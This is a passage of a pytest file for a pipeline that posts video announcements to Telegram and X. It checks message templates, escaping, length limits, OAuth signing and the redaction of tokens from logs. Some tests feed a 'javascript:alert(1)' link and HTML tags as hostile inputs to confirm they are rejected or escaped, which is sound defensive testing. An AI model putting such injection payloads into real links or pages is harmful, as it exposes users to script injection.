    switch was un-flippable from Actions — receipts_check uses fv.flag for exactly
    this reason (spec #13 said 'matches receipts_check')."""
    monkeypatch.setattr(site, "CATALOG", tmp_path / "cat.json")
    monkeypatch.setenv("SITE_PAGES", "false")
    assert site.enabled() is False
    monkeypatch.setenv("SITE_PAGES", "true")
    assert site.enabled() is True
    monkeypatch.delenv("SITE_PAGES")
    monkeypatch.setattr(site.fv, "setting", _settings(site_pages="false"))
    assert site.enabled() is False                       # a string in config.json too


def test_catalog_merge_survives_a_scalar_body():
    """merge_file's caller in CI has no `|| true`; under `bash -e` a TypeError here
    aborts the whole state-save step — the 'lose all state' path CLAUDE.md names."""
    good = json.dumps([{"page": "a.html", "date": "2026-01-01"}])
    for junk in ("42", '"a string"', "null", "true", '{"page": "a.html"}'):
        out = sm.merge_file("state/tools_index.json", junk, good)
        assert json.loads(out) == [{"page": "a.html", "date": "2026-01-01"}], junk
        assert sm.merge_file("state/tools_index.json", good, junk) is not None


# =============================================================== v3-F.2: Telegram
from factverse import notify


class _Resp:
    """A requests.Response stand-in: status + json body, exactly what send() reads."""
    def __init__(self, status=200, body=None, text=""):
        self.status_code, self._body, self.text = status, (body or {"ok": True}), text

    def json(self):
        return self._body


def _row(**over):
    r = {"status": "PUBLISHED", "format": "tool", "title": "A Tool",
         "youtube_url": "https://youtube.com/watch?v=ABCDEFGHIJK",
         "publish_at": "2026-08-31T16:45:00Z", "timestamp": "2026-08-31T12:30:00"}
    r.update(over)
    return r


_NOW = _dt.datetime(2026, 8, 31, 16, 55)


def _raiser(name):
    def _boom(*a, **k):
        raise RuntimeError(f"{name} exploded")
    return _boom


def test_tool_message_is_the_locked_template(monkeypatch):
    """v3-F.2 #5: exactly 8 lines, <code> for the tap-to-copy command, the PAGE
    (not the PDF) as the cheat-sheet link, the video last."""
    monkeypatch.setattr(notify.site.fv, "setting", _settings(deliverable_base_url="https://x.test"))
    msg = notify.format_message(_row(), _entry())
    assert msg.split("\n") == [
        "\U0001F527 <b>A Tool</b>",
        "",
        "<code>pip install x</code>",
        "",
        "It does a thing.",
        "",
        "\U0001F4C4 Cheat sheet: https://x.test/tools/2026-08-31-a.html",
        "▶ https://youtube.com/watch?v=ABCDEFGHIJK",
    ]


def test_story_row_posts_title_and_link_only():
    """#4: the ledger carries no description, so a news/evergreen/roundup post has
    nothing else it can truthfully say - and saying nothing 6 days a week is worse."""
    msg = notify.format_message(_row(format="news", title="Big News"), None)
    assert msg == "\U0001F4F0 <b>Big News</b>\n\n▶ https://youtube.com/watch?v=ABCDEFGHIJK"


def test_message_escapes_every_interpolated_value(monkeypatch):
    """parse_mode=HTML: an unescaped '<' in a repo title is a broken message at best
    and an injected tag at worst. The command is a model-supplied string too."""
    monkeypatch.setattr(notify.site.fv, "setting", _settings())
    msg = notify.format_message(_row(title='A & B <b>x</b> "q"'),
                                _entry(command='sh -c "a && b" <in>', what="5 < 6 & rising"))
    assert "&amp;" in msg and "&lt;b&gt;x&lt;/b&gt;" in msg
    assert "<b>A &amp; B" in msg                       # our own tags survive
    assert msg.count("<code>") == 1 and "&lt;in&gt;" in msg
    assert "5 &lt; 6 &amp; rising" in msg
    # quote=False: Telegram mandates &/</> only, and a NUMERIC reference (&#x27;
    # for an apostrophe) is not something the Bot API promises to decode -
    # "OpenAI's" is the commonest shape a story title has.
    assert '"q"' in msg and "&quot;" not in msg and "&#x27;" not in msg
    assert notify.format_message(_row(title="OpenAI's agent"), None).startswith(
        "\U0001F4F0 <b>OpenAI's agent</b>")


def test_message_omits_a_section_it_has_no_value_for(monkeypatch):
    """A tool row whose PDF/page seam failed still posts its command and its video."""
    monkeypatch.setattr(notify.site.fv, "setting", _settings())
    msg = notify.format_message(_row(), _entry(command="", what="", page=""))
    assert msg == "\U0001F527 <b>A Tool</b>\n▶ https://youtube.com/watch?v=ABCDEFGHIJK"
    assert notify.format_message(_row(title=""), None) == ""      # no title -> no message
    assert notify.format_message({}, None) == "" and notify.format_message(None, None) == ""


def test_message_refuses_a_scheme_it_did_not_check(monkeypatch):
    """site.safe_link is the existing guard: html escaping does nothing about a
    scheme, and Telegram auto-links a bare URL wherever it lands."""
    monkeypatch.setattr(notify.site.fv, "setting", _settings())
    assert notify.format_message(_row(youtube_url="javascript:alert(1)"), _entry()) == ""
    msg = notify.format_message(_row(), _entry(page="javascript:alert(1)"))
    assert "javascript" not in msg and "\U0001F4C4" not in msg


def test_pick_row_only_takes_a_public_recent_unposted_video():
    """#3 - the five ways a row must be refused, and the one way it is taken."""
    assert notify.pick_row([], [], _NOW) is None
    assert notify.pick_row([_row(status="UPLOAD_FAILED"), _row(status="SKIPPED_DUPLICATE_DAY")],
                           [], _NOW) is None
    assert notify.pick_row([_row(youtube_url="")], [], _NOW) is None
    # still private: publishAt has not fired yet
    assert notify.pick_row([_row(publish_at="2026-08-31T17:45:00Z")], [], _NOW) is None
    # 40 h old: the first-ever run must not announce a video from the old ledger
    assert notify.pick_row([_row(publish_at="2026-08-30T00:00:00Z")], [], _NOW) is None
    assert notify.pick_row([_row()], ["https://youtube.com/watch?v=ABCDEFGHIJK"], _NOW) is None
    assert notify.pick_row([_row()], [], _NOW)["title"] == "A Tool"


def test_pick_row_takes_the_newest_and_skips_an_untimed_row():
    old = _row(title="Older", youtube_url="https://youtu.be/OLDOLDOLDOL",
               publish_at="2026-08-31T04:00:00Z")
    new = _row(title="Newer")
    assert notify.pick_row([new, old], [], _NOW)["title"] == "Newer"
    assert notify.pick_row([old, new], [], _NOW)["title"] == "Newer"
    # eligibility cannot be proven without a time -> refuse rather than guess
    assert notify.pick_row([_row(publish_at="", timestamp="")], [], _NOW) is None
    assert notify.pick_row([_row(publish_at="not-a-date", timestamp="also-not")], [], _NOW) is None
    # publish_at missing but timestamp present: record_run always writes one
    assert notify.pick_row([_row(publish_at="", timestamp="2026-08-31T16:00:00")], [], _NOW)


def test_load_rows_survives_a_corrupt_ledger_line(tmp_path):
    p = tmp_path / "runs.jsonl"
    p.write_text('{"status": "PUBLISHED"}\nnot json\n\n42\n{"status": "HELD"}\n', encoding="utf-8")
    rows = notify.load_rows(p)
    assert [r["status"] for r in rows] == ["PUBLISHED", "HELD"]
    assert notify.load_rows(tmp_path / "missing.jsonl") == []


def test_catalog_entry_joins_on_the_video_url():
    rows = [_entry(page="a.html", video_url="https://youtu.be/AAAAAAAAAAA"),
            _entry(page="b.html", video_url="https://youtu.be/BBBBBBBBBBB")]
    assert notify.catalog_entry("https://youtu.be/BBBBBBBBBBB", rows)["page"] == "b.html"
    assert notify.catalog_entry("https://youtu.be/CCCCCCCCCCC", rows) is None
    assert notify.catalog_entry("", rows) is None and notify.catalog_entry("x", []) is None


def test_send_posts_the_locked_payload(monkeypatch):
    """#6/#9: the video link is what previews - without link_preview_options
    Telegram previews the FIRST link in the message, which is the page."""
    seen = {}

    def fake_post(url, json=None, timeout=None):
        seen.update(url=url, payload=json, timeout=timeout)
        return _Resp()

    monkeypatch.setattr(notify.requests, "post", fake_post)
    assert notify.send("hello", "https://youtu.be/ABCDEFGHIJK", token="T0K", chat="@c") is True
    assert seen["url"] == "https://api.telegram.org/botT0K/sendMessage"
    assert seen["timeout"] == 20
    assert seen["payload"]["chat_id"] == "@c" and seen["payload"]["parse_mode"] == "HTML"
    assert seen["payload"]["text"] == "hello"
    assert seen["payload"]["link_preview_options"] == {
        "url": "https://youtu.be/ABCDEFGHIJK", "prefer_large_media": True}
    # nothing to say, or nowhere to say it -> no HTTP call at all
    calls = []
    monkeypatch.setattr(notify.requests, "post", lambda *a, **k: calls.append(1))
    assert notify.send("", "x", token="T", chat="@c") is False
    assert notify.send("hi", "x", token="", chat="@c") is False
    assert notify.send("hi", "x", token="T", chat="") is False
    assert calls == []


def test_send_retries_once_without_the_preview_field_on_400(monkeypatch):
    """A 400 is the request's shape, not the network: an API change should cost the
    preview, not the post. Exactly one retry - never a loop against a live API."""
    calls = []

    def fake_post(url, json=None, timeout=None):
        calls.append(dict(json))
        if len(calls) == 1:
            return _Resp(400, {"ok": False}, "Bad Request: unknown field")
        return _Resp()

    monkeypatch.setattr(notify.requests, "post", fake_post)
    assert notify.send("hi", "https://youtu.be/ABCDEFGHIJK", token="T", chat="@c") is True
    assert len(calls) == 2
    assert "link_preview_options" in calls[0] and "link_preview_options" not in calls[1]

    # a 400 with no preview field to drop is final
    hits = []

    def only_400(url, json=None, timeout=None):
        hits.append(1)
        return _Resp(400, {"ok": False}, "Bad Request")

    monkeypatch.setattr(notify.requests, "post", only_400)
    assert notify.send("hi", "", token="T", chat="@c") is False and len(hits) == 1


def test_send_never_calls_a_refusal_a_success(monkeypatch, capsys):
    """The _notify_review lesson (v3-C.2 #12): requests does NOT raise on 401/403,
    and a 200 can still carry ok:false. Announcing a post nobody received is worse
    than announcing none, because then nobody goes looking."""
    for resp in (_Resp(200, {"ok": False, "description": "chat not found"}),
                 _Resp(401, {"ok": False}, "Unauthorized"),
                 _Resp(403, {"ok": False}, "bot is not a member of the channel chat")):
        monkeypatch.setattr(notify.requests, "post",
                            lambda url, json=None, timeout=None, _r=resp: _r)
        assert notify.send("hi", "", token="T", chat="@c") is False
    out = capsys.readouterr().out
    assert out.count("telegram failed") == 3 and "HTTP 401" in out

    class _Junk(_Resp):
        def json(self):
            raise ValueError("not json")

    monkeypatch.setattr(notify.requests, "post", lambda url, json=None, timeout=None: _Junk(200))
    assert notify.send("hi", "", token="T", chat="@c") is False


def test_the_token_never_reaches_the_log(monkeypatch, capsys):
    """requests quotes the request URL inside its own exception message -
    'Max retries exceeded with url: /bot<TOKEN>/sendMessage' - and Actions logs are
    public. Actions masks secrets; a local run and a fork do not."""
    import requests as _rq
    tok = "123456:AAH-REAL-LOOKING-TOKEN"

    def boom(url, json=None, timeout=None):
        raise _rq.exceptions.ConnectionError(
            f"HTTPSConnectionPool(host='api.telegram.org'): Max retries exceeded "
            f"with url: /bot{tok}/sendMessage")

    monkeypatch.setattr(notify.requests, "post", boom)
    assert notify.send("hi", "", token=tok, chat="@c") is False
    out = capsys.readouterr().out
    assert tok not in out and "AAH-REAL-LOOKING-TOKEN" not in out
    assert "bot***" in out and "telegram failed" in out
    assert notify._redact(f"x {tok} y", tok) == "x *** y"
    assert notify._redact("nothing", "") == "nothing"


def test_main_is_a_no_op_when_it_is_switched_off_or_unconfigured(monkeypatch, capsys):
    """#7/#11: the seam costs nothing until the owner creates the secret, and the
    kill switch must be flippable from Actions (fv.flag, not fv.setting)."""
    calls = []
    monkeypatch.setattr(notify.requests, "post", lambda *a, **k: calls.append(1))
    monkeypatch.delenv("TELEGRAM_BOT_TOKEN", raising=False)
    monkeypatch.delenv("TELEGRAM_CHAT_ID", raising=False)
    monkeypatch.delenv("TELEGRAM", raising=False)
    _no_x(monkeypatch)
    assert notify.main() == 0 and calls == []
    assert "not configured" in capsys.readouterr().out

    monkeypatch.setenv("TELEGRAM_BOT_TOKEN", "T")
    monkeypatch.setenv("TELEGRAM_CHAT_ID", "@c")
    monkeypatch.setenv("TELEGRAM", "false")             # a string env var, not a bool
    assert notify.enabled() is False
    assert notify.main() == 0 and calls == []
    monkeypatch.delenv("TELEGRAM")
    with pytest.MonkeyPatch.context() as mp:
        mp.setattr(notify.fv, "setting", _settings(telegram="false"))
        assert notify.enabled() is False                # a string in config.json too


def test_main_records_a_url_only_after_a_successful_post(monkeypatch, tmp_path, capsys):
    """The whole idempotence contract: post once, remember it, never post it twice -
    and on a failure remember NOTHING, so the next firing may still try."""
    runs, state = tmp_path / "runs.jsonl", tmp_path / "notified.json"
    now = _dt.datetime.utcnow().isoformat(timespec="seconds")
    runs.write_text(json.dumps(_row(publish_at=now, timestamp=now)) + "\n", encoding="utf-8")
    monkeypatch.setattr(notify, "RUNS_LOG", runs)
    monkeypatch.setattr(notify, "NOTIFIED", state)
    monkeypatch.setattr(notify.site, "CATALOG", tmp_path / "cat.json")
    monkeypatch.setattr(notify.fv, "setting", _settings(telegram=True))
    monkeypatch.setenv("TELEGRAM_BOT_TOKEN", "T")
    monkeypatch.setenv("TELEGRAM_CHAT_ID", "@c")
    monkeypatch.delenv("TELEGRAM", raising=False)
    _no_x(monkeypatch)

    sent = []

    def _fail(text, link=""):
        sent.append((text, link))
        return False

    monkeypatch.setattr(notify, "send", _fail)
    assert notify.main() == 0
    assert len(sent) == 1 and not state.exists()        # a failure records nothing

    def _ok(text, link=""):
        sent.append((text, link))
        return True

    monkeypatch.setattr(notify, "send", _ok)
    assert notify.main() == 0
    assert notify.load_notified(state) == ["https://youtube.com/watch?v=ABCDEFGHIJK"]
    assert "Telegram: posted" in capsys.readouterr().out
    assert sent[-1][1] == "https://youtube.com/watch?v=ABCDEFGHIJK"   # the preview target

    assert notify.main() == 0                            # second firing: already sent
    assert len(sent) == 2 and "nothing new to post" in capsys.readouterr().out


def test_main_never_raises_and_never_fails_the_workflow(monkeypatch):
    """An unattended announcement job that exits non-zero turns the repo red for a
    message nobody missed. Every seam is stubbed to raise; main() still returns 0."""
    monkeypatch.setenv("TELEGRAM_BOT_TOKEN", "T")
    monkeypatch.setenv("TELEGRAM_CHAT_ID", "@c")
    monkeypatch.delenv("TELEGRAM", raising=False)
    _no_x(monkeypatch)
    for name in ("load_notified", "load_rows", "pick_row", "catalog_entry",
                 "format_message", "send", "save_notified"):
        with pytest.MonkeyPatch.context() as mp:
            mp.setattr(notify.fv, "setting", _settings(telegram=True))
            mp.setattr(notify, name, _raiser(name))
            assert notify.main() == 0, name


def test_notified_state_gets_the_both_halves_treatment():
    """The standing trap: a tracked file the run writes must be in BOTH
    state_merge.FILES and the workflow's stash list, or `checkout -B main
    origin/main` reverts it silently and every day re-posts the same video."""
    assert "state/notified.json" in sm.FILES
    root = Path(__file__).resolve().parents[1]
    pub = (root / ".github/workflows/publish.yml").read_text(encoding="utf-8")
    assert "state/notified.json" in pub
    nyml = (root / ".github/workflows/notify.yml").read_text(encoding="utf-8")
    assert "state/notified.json" in nyml and "python -m factverse.state_merge" in nyml
    # the post must happen BEFORE the state-save, or the URL is never remembered
    assert nyml.index("python -m factverse.notify") < nyml.index("python -m factverse.state_merge")
    # a list of strings: the generic ordered union is already the right semantics
    merged = json.loads(sm.merge_file("state/notified.json",
                                      json.dumps(["a", "b"]), json.dumps(["b", "c"])))
    assert sorted(merged) == ["a", "b", "c"]
    # a corrupt or scalar body must not raise inside a `bash -e` CI step
    for junk in ("42", "null", '"str"', "{}"):
        assert sm.merge_file("state/notified.json", junk, json.dumps(["a"])) is not None


def test_notified_state_is_capped_and_survives_corruption(tmp_path):
    p = tmp_path / "n.json"
    notify.save_notified([f"u{i}" for i in range(600)], p)
    kept = notify.load_notified(p)
    assert len(kept) == 500 and kept[0] == "u100" and kept[-1] == "u599"
    p.write_text("{not json", encoding="utf-8")
    assert notify.load_notified(p) == []
    p.write_text('["a", 42, null, "  "]', encoding="utf-8")
    assert notify.load_notified(p) == ["a"]
    assert notify.load_notified(tmp_path / "missing.json") == []


def test_message_can_never_exceed_the_bot_api_limit(monkeypatch):
    """sendMessage rejects >4096 chars with a 400 — and a 400 costs the ENTIRE post,
    i.e. a silent no-post day. A README-derived command and an LLM-written 'what' are
    both unbounded, so the optional blocks are shed; the title and the video link,
    which are the whole point of the message, always survive."""
    monkeypatch.setattr(notify.site.fv, "setting", _settings())
    msg = notify.format_message(_row(title="T" * 900),
                                _entry(command="c" * 5000, what="w" * 5000))
    assert len(msg) <= notify.MAX_TEXT
    assert msg.startswith("\U0001F527 <b>" + "T" * 300 + "</b>")
    assert msg.endswith("▶ https://youtube.com/watch?v=ABCDEFGHIJK")
    # an escaping-heavy payload (every char becomes 5) sheds by VALUE, not position:
    # the prose goes first, the command is the last thing to go
    big = notify.format_message(_row(), _entry(command="&" * 800, what="&" * 600))
    assert len(big) <= notify.MAX_TEXT and "<code>" in big and "Cheat sheet" not in big
    # and when even the command cannot fit, the title and the video still ship
    worst = notify.format_message(_row(title="&" * 300), _entry(command="&" * 800))
    assert len(worst) <= notify.MAX_TEXT and "<code>" not in worst
    assert worst.endswith("▶ https://youtube.com/watch?v=ABCDEFGHIJK")
    # nothing is ever cut mid-tag or mid-entity: the tags still balance
    for m in (msg, big):
        assert m.count("<b>") == m.count("</b>") and m.count("<code>") == m.count("</code>")


# ===================================================================== v3-F.3: X
# The four env vars are read straight off os.environ, and factverse.config loads
# a local .env into it at import — so a machine with real X credentials would
# otherwise make LIVE posts from the test suite.
_X_ENV = ("X_API_KEY", "X_API_SECRET", "X_ACCESS_TOKEN", "X_ACCESS_SECRET")


def _no_x(monkeypatch):
    for name in _X_ENV + ("TWITTER",):
        monkeypatch.delenv(name, raising=False)


def _with_x(monkeypatch, **over):
    vals = dict(zip(_X_ENV, ("CK", "CS", "AT", "ATS")))
    vals.update(over)
    for k, v in vals.items():
        monkeypatch.setenv(k, v)
    monkeypatch.delenv("TWITTER", raising=False)
    return tuple(vals[k] for k in _X_ENV)


class _XResp:
    """A requests.Response stand-in for the X endpoint: creation returns 201 with
    a `data.id`, and requests does NOT raise on 401/403."""
    def __init__(self, status=201, body=None, text=""):
        self.status_code = status
        self._body = {"data": {"id": "1234567890"}} if body is None else body
        self.text = text

    def json(self):
        return self._body


def test_oauth_matches_the_published_known_answer_vectors():
    """F.3 #4: hand-rolled OAuth 1.0a is only defensible if it is pinned to vectors
    somebody else published. Percent-encoding is where these go wrong, so the RFC
    vector is the one with a repeated key, a blank value, an '@' and an already-
    percent-encoded value in it."""
    # RFC 5849 section 3.4.1.1 base string. Uses errata 2550's corrected `a2=r b`
    # (the printed RFC shows `a%20b` in the result but `r b` in the request).
    rfc_params = [("a2", "r b"), ("a3", "2 q"), ("a3", "a"), ("b5", "=%3D"),
                  ("c@", ""), ("c2", ""),
                  ("oauth_consumer_key", "9djdj82h48djs9d2"),
                  ("oauth_nonce", "7d8f3e4a"),
                  ("oauth_signature_method", "HMAC-SHA1"),
                  ("oauth_timestamp", "137131201"),
                  ("oauth_token", "kkk9d7dh3k39sjv7")]
    assert notify.oauth_base_string("POST", "http://example.com/request", rfc_params) == (
        "POST&http%3A%2F%2Fexample.com%2Frequest&a2%3Dr%2520b%26a3%3D2%2520q%26a3%3Da"
        "%26b5%3D%253D%25253D%26c%2540%3D%26c2%3D%26oauth_consumer_key%3D9djdj82h48djs9d2"
        "%26oauth_nonce%3D7d8f3e4a%26oauth_signature_method%3DHMAC-SHA1"
        "%26oauth_timestamp%3D137131201%26oauth_token%3Dkkk9d7dh3k39sjv7")

    # Twitter's own "Creating a signature" worked example — the only published pair
    # that checks the HMAC too (RFC 5849's own oauth_signature is a placeholder).
    tw_params = [("status", "Hello Ladies + Gentlemen, a signed OAuth request!"),
                 ("include_entities", "true"),
                 ("oauth_consumer_key", "xvz1evFS4wEEPTGEFPHBog"),
                 ("oauth_nonce", "kYjzVBB8Y0ZFabxSWbWovY3uYSQ2pTgmZeNu2VS4cg"),
                 ("oauth_signature_method", "HMAC-SHA1"),
                 ("oauth_timestamp", "1318622958"),
                 ("oauth_token", "370773112-GmHxMAgYyLbNEtIKZeRNFsMKPR9EyMZeS9weJAEb"),
                 ("oauth_version", "1.0")]
    base = notify.oauth_base_string(
        "POST", "https://api.twitter.com/1.1/statuses/update.json", tw_params)
    assert base == (
        "POST&https%3A%2F%2Fapi.twitter.com%2F1.1%2Fstatuses%2Fupdate.json&include_entities"
        "%3Dtrue%26oauth_consumer_key%3Dxvz1evFS4wEEPTGEFPHBog%26oauth_nonce"
        "%3DkYjzVBB8Y0ZFabxSWbWovY3uYSQ2pTgmZeNu2VS4cg%26oauth_signature_method%3DHMAC-SHA1"
        "%26oauth_timestamp%3D1318622958%26oauth_token%3D370773112-GmHxMAgYyLbNEtIKZeRNFsMKPR9E"
        "yMZeS9weJAEb%26oauth_version%3D1.0%26status%3DHello%2520Ladies%2520%252B%2520Gentlemen"
        "%252C%2520a%2520signed%2520OAuth%2520request%2521")
    assert notify.oauth_signature(base, "kAcSOqF21Fu85e7zjz7ZN2U4ZRhfV3WpwPAoE3Z7kBw",
                                  "LswwdoUaIvS8ltyTt5jkRh4J50vUPVVHtR2YPi5kE") == \
        "hCtSmYh+iHYCEqBWrE7C7hYmtUk="
    # The signing key is pct(consumer)&pct(token): an empty token secret still keeps
    # the separator (the request-token case), and an already-encoded secret is
    # encoded AGAIN rather than passed through — the two are NOT the same key.
    import hmac as _h, hashlib as _hl, base64 as _b64
    for cs, ats in (("c s", ""), ("c%20s", "t/s")):
        key = f"{notify._pct(cs)}&{notify._pct(ats)}".encode()
        assert notify.oauth_signature("POST&a&b", cs, ats) == _b64.b64encode(
            _h.new(key, b"POST&a&b", _hl.sha1).digest()).decode()
    assert notify.oauth_signature("POST&a&b", "c s", "") != \
        notify.oauth_signature("POST&a&b", "c%20s", "")
    assert notify._pct("a b~c-d_e.f/g") == "a%20b~c-d_e.f%2Fg"


def test_oauth_header_is_signed_and_never_repeats_a_nonce():
    """The header carries every oauth_* field plus the signature, each value
    percent-encoded inside quotes. A fixed nonce+timestamp makes it deterministic;
    without them two calls must differ, or X rejects the second as a replay."""
    h = notify.oauth_header("POST", notify.X_API, ("CK", "CS", "AT", "ATS"),
                            nonce="NONCE1", timestamp="1700000000")
    assert h.startswith("OAuth ")
    for field in ("oauth_consumer_key=\"CK\"", "oauth_token=\"AT\"",
                  "oauth_nonce=\"NONCE1\"", "oauth_timestamp=\"1700000000\"",
                  "oauth_signature_method=\"HMAC-SHA1\"", "oauth_version=\"1.0\""):
        assert field in h, field
    assert "oauth_signature=\"" in h and "%3D" in h.split('oauth_signature="')[1]
    assert h == notify.oauth_header("POST", notify.X_API, ("CK", "CS", "AT", "ATS"),
                                    nonce="NONCE1", timestamp="1700000000")
    # the body is NOT signed (X v2 is JSON, and OAuth 1.0a only folds a
    # form-encoded body in), so the signature depends on method + URL + oauth only
    a = notify.oauth_header("POST", notify.X_API, ("CK", "CS", "AT", "ATS"))
    b = notify.oauth_header("POST", notify.X_API, ("CK", "CS", "AT", "ATS"))
    assert a != b


def test_weighted_len_counts_the_way_x_counts():
    """F.3 #8: X's limit is 280 WEIGHTED chars. len() would ship posts the API
    refuses with 'Text is too long' — every emoji is 2, and so is every CJK char."""
    assert notify.weighted_len("abc") == 3
    assert notify.weighted_len("") == 0 and notify.weighted_len(None) == 0
    # a URL is 23 whatever its length: t.co rewrites it
    assert notify.weighted_len("https://x.test/" + "a" * 200) == 23
    assert notify.weighted_len("https://a.b") == 23
    assert notify.weighted_len("a https://x.test/" + "q" * 99 + " b") == 1 + 23 + 1 + 2
    assert notify.weighted_len("\U0001F527") == 2 and notify.weighted_len("\U0001F4F0") == 2
    assert notify.weighted_len("日本") == 4          # CJK
    assert notify.weighted_len("…") == 1                # the ellipsis we append
    assert notify.weighted_len("café") == 4             # Latin-1 is inside 0-4351


def test_tool_post_is_the_locked_template(monkeypatch):
    """F.3 #6: 6 lines, the command bare (X has no markup and no tap-to-copy), the
    PAGE above the video, and no hashtags."""
    monkeypatch.setattr(notify.site.fv, "setting", _settings(deliverable_base_url="https://x.test"))
    post = notify.format_post(_row(), _entry())
    assert post.split("\n") == [
        "\U0001F527 A Tool",
        "",
        "pip install x",
        "",
        "\U0001F4C4 https://x.test/tools/2026-08-31-a.html",
        "▶ https://youtube.com/watch?v=ABCDEFGHIJK",
    ]
    assert "#" not in post and "<" not in post
    assert notify.weighted_len(post) <= notify.MAX_POST


def test_story_post_is_the_locked_template():
    """F.3 #7: the ledger carries no description, so a story row has nothing else
    truthful to say — and an apostrophe stays an apostrophe, because there is
    nothing to escape for."""
    post = notify.format_post(_row(format="news", title="OpenAI's agent SDK"), None)
    assert post.split("\n") == ["\U0001F4F0 OpenAI's agent SDK", "",
                                "▶ https://youtube.com/watch?v=ABCDEFGHIJK"]
    assert notify.format_post(_row(title=""), None) == ""
    assert notify.format_post({}, None) == "" and notify.format_post(None, None) == ""


def test_post_omits_a_section_it_has_no_truthful_value_for(monkeypatch):
    monkeypatch.setattr(notify.site.fv, "setting", _settings())
    post = notify.format_post(_row(), _entry(command="", page=""))
    assert post.split("\n") == ["\U0001F527 A Tool", "",
                                "▶ https://youtube.com/watch?v=ABCDEFGHIJK"]


def test_post_never_carries_a_scheme_it_did_not_check(monkeypatch):
    """The catalog is merged state read back off origin/main, and `page` is derived
    from model output. site.safe_link is the same guard the site and screencap use."""
    monkeypatch.setattr(notify.site.fv, "setting", _settings())
    assert notify.format_post(_row(youtube_url="javascript:alert(1)"), _entry()) == ""
    post = notify.format_post(_row(), _entry(page="javascript:alert(1)"))
    assert "javascript" not in post and "\U0001F4C4" not in post
    assert post.endswith("▶ https://youtube.com/watch?v=ABCDEFGHIJK")


def test_post_sheds_by_value_and_only_then_cuts_the_title(monkeypatch):
    """F.3 #9: the page link goes first, the command second, the title last — and
    the title cut is a real slice, which is safe here (plain text) and was not safe
    in the Telegram body, where a cut mid-tag is a 400 of its own."""
    monkeypatch.setattr(notify.site.fv, "setting", _settings(deliverable_base_url="https://x.test"))
    video = "▶ https://youtube.com/watch?v=ABCDEFGHIJK"

    # 0. under the limit nothing is shed at all
    whole = notify.format_post(_row(), _entry(command="c" * 200))
    assert notify.weighted_len(whole) <= notify.MAX_POST and "📄" in whole

    # 1. one char over, and the page link is the first thing to go
    p1 = notify.format_post(_row(), _entry(command="c" * 240))
    assert notify.weighted_len(p1) <= notify.MAX_POST
    assert "c" * 200 in p1 and "\U0001F4C4" not in p1 and p1.endswith(video)

    # 2. then the command
    p2 = notify.format_post(_row(title="T" * 200), _entry(command="c" * 200))
    assert notify.weighted_len(p2) <= notify.MAX_POST
    assert "ccc" not in p2 and "\U0001F4C4" not in p2 and p2.endswith(video)
    assert p2.startswith("\U0001F527 " + "T" * 200)          # the title is untouched

    # 3. only when nothing optional is left is the title itself cut, on a word
    #    boundary, with a single ellipsis — and the video link always survives
    p3 = notify.format_post(_row(title="word " * 120), _entry(command="c" * 200))
    assert notify.weighted_len(p3) <= notify.MAX_POST
    assert p3.startswith("\U0001F527 word word") and p3.endswith(video)
    assert p3.count("…") == 1 and p3.split("\n")[0].endswith("word…")

    # 4. a title with no spaces at all still fits, and so does a CJK one (2 apiece).
    #    The URL cases are the ones a per-character cut gets wrong on its own:
    #    weighted_len charges a URL 23 whatever its length, so a title carrying a
    #    SHORT url measures more as a whole than as the sum of its characters.
    for title in ("A" * 600, "日" * 400, "\U0001F600" * 300,
                  "https://a.io " * 40, ("word " * 60 + "https://a.io ") * 3,
                  "https://a.io" + "B" * 400):
        post = notify.format_post(_row(title=title), _entry())
        assert notify.weighted_len(post) <= notify.MAX_POST, title[:4]
        assert post.endswith(video)


def test_send_x_posts_the_locked_payload(monkeypatch):
    """F.3 #5: POST /2/tweets with a JSON body and an OAuth 1.0a header."""
    seen = {}

    def fake_post(url, json=None, headers=None, timeout=None):
        seen.update(url=url, payload=json, headers=headers or {}, timeout=timeout)
        return _XResp()

    monkeypatch.setattr(notify.requests, "post", fake_post)
    assert notify.send_x("hello", ("CK", "CS", "AT", "ATS")) is True
    assert seen["url"] == "https://api.x.com/2/tweets" and seen["timeout"] == 20
    assert seen["payload"] == {"text": "hello"}
    assert seen["headers"]["Authorization"].startswith("OAuth ")
    assert seen["headers"]["Content-Type"] == "application/json"

    # nothing to say, or no credential to say it with -> no HTTP call at all
    calls = []
    monkeypatch.setattr(notify.requests, "post", lambda *a, **k: calls.append(1))
    assert notify.send_x("", ("CK", "CS", "AT", "ATS")) is False
    for i in range(4):
        creds = ["CK", "CS", "AT", "ATS"]
        creds[i] = ""
        assert notify.send_x("hi", tuple(creds)) is False, i
    # a malformed credential tuple is "unconfigured", not a crash
    for bad in ((), ("CK",), ("CK", "CS", "AT", "ATS", "EXTRA"), 42):
        assert notify.send_x("hi", bad) is False, bad
    assert calls == []


def test_send_x_never_calls_a_refusal_a_success_and_never_retries(monkeypatch, capsys):
    """X answers a repeated post with 403 duplicate-content, so a retry on a call
    that may have half-succeeded is how one video becomes two posts."""
    for resp in (_XResp(403, {"detail": "duplicate content"}, "Forbidden"),
                 _XResp(401, {"title": "Unauthorized"}, "Unauthorized"),
                 _XResp(200, {"data": {}}),               # 200 with no id
                 _XResp(201, {"errors": [{"message": "nope"}]}),
                 _XResp(201, {"data": "not-a-dict"})):
        hits = []

        def one(url, json=None, headers=None, timeout=None, _r=resp):
            hits.append(1)
            return _r

        monkeypatch.setattr(notify.requests, "post", one)
        assert notify.send_x("hi", ("CK", "CS", "AT", "ATS")) is False
        assert hits == [1]                                # exactly one call, ever
    out = capsys.readouterr().out
    assert out.count("x failed") == 5 and "HTTP 403" in out and "HTTP 401" in out

    class _Junk(_XResp):
        def json(self):
            raise ValueError("not json")

    monkeypatch.setattr(notify.requests, "post",
                        lambda url, json=None, headers=None, timeout=None: _Junk(201))
    assert notify.send_x("hi", ("CK", "CS", "AT", "ATS")) is False


def test_the_x_credentials_never_reach_the_log(monkeypatch, capsys):
    """Actions masks its own secrets; a local run and a fork do not. The four
    values go through _redact for the same reason the bot token does."""
    import requests as _rq
    creds = ("CONSUMERKEY123", "CONSUMERSECRET456", "ACCESSTOKEN789", "ACCESSSECRET000")

    def boom(url, json=None, headers=None, timeout=None):
        raise _rq.exceptions.ConnectionError(
            "proxy rejected header OAuth oauth_consumer_key=\"CONSUMERKEY123\", "
            "oauth_token=\"ACCESSTOKEN789\" signed with CONSUMERSECRET456/ACCESSSECRET000")

    monkeypatch.setattr(notify.requests, "post", boom)
    assert notify.send_x("hi", creds) is False
    out = capsys.readouterr().out
    for value in creds:
        assert value not in out, value
    assert "***" in out and "x failed" in out
    # a short secret that is a substring of a longer one must not cut the long one
    # in half and leak the remainder
    assert notify._redact("AB and ABCD", "", ("AB", "ABCD")) == "*** and ***"


